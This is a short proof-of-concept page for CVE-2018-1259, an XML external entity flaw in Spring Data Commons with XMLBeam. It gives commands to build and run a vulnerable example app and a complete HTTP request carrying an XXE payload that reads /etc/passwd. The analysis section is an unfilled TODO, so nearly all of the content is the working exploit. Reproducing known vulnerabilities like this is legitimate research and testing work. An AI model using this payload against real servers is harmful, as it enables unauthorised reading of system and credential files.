## CVE-2018-1259: XXE with Spring Data’s XMLBeam integration

#### Vulnerability Description

Spring Data Commons, versions prior to 1.13 to 1.13.11 and 2.0 to 2.0.6 used in combination with XMLBeam 1.4.14 or earlier versions contain a property binder vulnerability caused by improper restriction of XML external entity references as underlying library XMLBeam does not restrict external reference expansion. An unauthenticated remote malicious user can supply specially crafted request parameters against Spring Data’s projection-based request payload binding to access arbitrary files on the system.

The PoC is from the example of spring-data-commons: 
https://github.com/spring-projects/spring-data-examples/tree/master/web/projection

#### Usage of PoC

```shell
git clone https://github.com/spring-projects/spring-data-examples.git
cd spring-data-examples
git checkout ad2b77e
cd web/projection
mvn clean package
java -jar spring-data-web-projection-2.0.0.BUILD-SNAPSHOT.jar
```

Post data to `http://host:8080/users`

```
POST / HTTP/1.1
Host: localhost:8080
Content-Length: 199
Cache-Control: max-age=0
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost:8080/users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<user>
	<firstname>&xxe;</firstname>
	<lastname>melody</lastname>
</user>
```

#### Analyze

TODO

#### Reference

- <https://jira.spring.io/browse/DATACMNS-1292>
- [Spring Data Commons: Web databinding support](https://docs.spring.io/spring-data/commons/docs/current/reference/html/#core.web.binding)